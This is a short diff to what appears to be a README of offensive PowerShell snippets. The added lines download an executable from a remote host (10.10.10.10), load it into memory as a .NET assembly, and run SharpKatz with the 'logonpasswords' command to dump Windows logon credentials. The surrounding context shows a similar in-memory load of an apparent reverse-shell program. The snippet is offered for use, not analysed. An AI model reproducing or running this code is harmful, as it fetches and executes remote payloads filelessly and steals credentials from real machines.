@@ -9,6 +9,13 @@ $assem = [System.Reflection.Assembly]::Load($data)
 [rev.Program]::Main("".Split())
 ```
 
+**With parameters:**
+```powershell
+$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.10.10/rev.exe')
+$assem = [System.Reflection.Assembly]::Load($data)
+[SharpKatz.Program]::Main("-Command logonpasswords".Split())
+```
+
 ### Contents
 |Snippet Name|Description|
 |--|--|
